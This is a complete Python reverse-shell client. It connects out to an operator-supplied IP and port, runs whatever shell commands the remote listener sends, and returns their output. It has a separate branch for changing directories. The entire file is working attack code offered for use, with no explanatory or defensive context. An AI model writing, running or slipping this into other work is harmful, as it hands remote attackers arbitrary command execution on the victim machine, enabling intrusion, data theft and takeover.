import socket
import subprocess
import os
import argparse

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Client")
    parser.add_argument("--my-ip", type=str, required=True, help="The IP address of the listening server")
    parser.add_argument("--port", type=int, default=9999, help="The port to connect to")
    args = parser.parse_args()

    HOST = args.my_ip  # The IP address of the listening server
    PORT = args.port    # The port to connect to

    s = socket.socket()
    s.connect((HOST, PORT))

    while True:
        # Receive the command from the server
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break

        # Execute the command and get the output
        if command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                s.send(b'Changed directory')
            except FileNotFoundError as e:
                s.send(str(e).encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)

    s.close()

if __name__ == "__main__":
    main()
